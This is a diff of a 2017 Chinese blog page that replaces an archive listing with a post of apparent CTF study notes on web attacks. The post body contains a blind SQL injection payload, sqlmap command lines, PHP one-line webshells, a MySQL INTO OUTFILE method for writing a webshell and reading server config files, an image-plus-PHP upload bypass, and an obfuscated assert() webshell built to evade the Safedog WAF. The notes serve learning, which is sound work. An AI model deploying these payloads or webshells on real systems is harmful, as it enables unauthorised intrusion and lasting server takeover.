@@ -6,15 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | Heatxtf</title>
+  <title>11月总结 | Heatxtf</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Heatxtf">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+  <meta name="description" content="·sql手注：1.报错注入                2.盲注       文件上传（包含）：一句话木马        变量覆盖漏洞        逻辑处理漏洞        二次漏洞 盲注- (ascii(substr((select database()) ,1,1))) &amp;lt; 116 --+  locus IN(&amp;apos;AB086827&amp;apos;,&amp;apos;AF040764&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="11月总结">
+<meta property="og:url" content="http://yoursite.com/2017/11/29/11月总结/index.html">
 <meta property="og:site_name" content="Heatxtf">
+<meta property="og:description" content="·sql手注：1.报错注入                2.盲注       文件上传（包含）：一句话木马        变量覆盖漏洞        逻辑处理漏洞        二次漏洞 盲注- (ascii(substr((select database()) ,1,1))) &amp;lt; 116 --+  locus IN(&amp;apos;AB086827&amp;apos;,&amp;apos;AF040764&amp;">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-11-29T05:00:29.428Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Heatxtf">
+<meta name="twitter:title" content="11月总结">
+<meta name="twitter:description" content="·sql手注：1.报错注入                2.盲注       文件上传（包含）：一句话木马        变量覆盖漏洞        逻辑处理漏洞        二次漏洞 盲注- (ascii(substr((select database()) ,1,1))) &amp;lt; 116 --+  locus IN(&amp;apos;AB086827&amp;apos;,&amp;apos;AF040764&amp;">
   
     <link rel="alternative" href="/atom.xml" title="Heatxtf" type="application/atom+xml">
   
@@ -150,76 +154,189 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-11月总结" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      11月总结
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/11/29/11月总结/" class="archive-article-date">
+
+        
+        <a href="/2017/11/29/11月总结/" class="archive-article-date">
   	<time datetime="2017-11-29T05:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-29</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/11/29/11月总结/">11月总结</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>·<strong>sql手注：1.报错注入<br>                2.盲注<br>       文件上传（包含）：一句话木马</strong><br>        变量覆盖漏洞<br>        逻辑处理漏洞<br>        二次漏洞</p>
+<p><em>盲注</em><br>-</p>
+<pre><code>(ascii(substr((select database()) ,1,1))) &lt; 116 --+
 
-        <div class="article-info info-on-right">
-          
-          
+locus IN(&apos;AB086827&apos;,&apos;AF040764&apos;)
+</code></pre><p>sqlmap</p>
+<pre><code>过注入点扫描确认信息           python sqlmap.py -u url --dbms mysql
+指定参数注入                  python sqlmap.py -u &quot;http://192.168.1.1/page.php?id=1&amp;cat=2&quot; -v 1 -p &quot;cat,id&quot;
+指定方法和post的数据 python sqlmap.py -u &quot;http://192.168.1.1/page.php&quot; --method &quot;POST&quot; -- data &quot;id=1&amp;cat=2&quot;
+指定cookie,可以注入一些需要登录的地址 python sqlmap.py -u &quot;http://192.168.1.1/page.php?id=1&amp;cat=2&quot; --cookie &quot;COOKIE_VALUE&quot;
+[部分sqlmap手册](http://localhost/sqlmap手册（部分）.txt)
+</code></pre><h2 id="文件上传（包含）：一句话木马"><a href="#文件上传（包含）：一句话木马" class="headerlink" title="文件上传（包含）：一句话木马"></a>文件上传（包含）：一句话木马</h2><pre><code>原型：eval($_GET[‘x’]);或者assert($_GET[‘x’]);
 
+上述我们提到了 load_file(),但是当前台无法导出数据的时候，我们可以利用下面的语句：
+selectload_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile ‘c:\\wamp\\www\\test.php’
+可以利用该语句将服务器当中的内容导入到 web 服务器下的目录，这样就可以得到数据了。 上述 my.ini当中存在 password 项（不过默认被注释），当然会有很多的内容可以被导出来， 这个要平时积累。
+union+select+webshell的hex编码+into+outfile+‘网络物理路径\\a.php’
+导入外部文件报错：The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
+
+
+实验吧的题目 [上传绕过](http://ctf5.shiyanbar.com/web/upload/)
+图片php合并 copy q.jpg/b+xxx.php/xxx.jpg 通过文件头检查
+
+字符串截取绕过安全狗
+&lt;?php
+ $a = substr(&quot;abcdefghijklmnopqrstufwxyz&quot;,0,1);
+ $b = substr(&quot;abcdefghijklmnopqrstufwxyz&quot;,17,3);
+ $c = substr(&quot;abcdefghijklmnopqrstufwxyz&quot;,3,2);
+ $ss = $a.$b.$c;
+ $d  = $ss[0].$ss[2].$ss[2]; //ass
+ $dd = $ss[5].$ss[1].$ss[3]; //ert
+ $x = $d.$dd;//assert
+$x($_POST[&apos;x&apos;]);
+?&gt;
+</code></pre>
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2017/11/29/11月总结/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/11/14/hello-world/" class="archive-article-date">
-  	<time datetime="2017-11-14T09:18:06.100Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-14</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2017/11/14/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Hello World</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/11/14/hello-world/">Hello World</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
+
+  
 
 
           </div>
@@ -242,8 +359,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
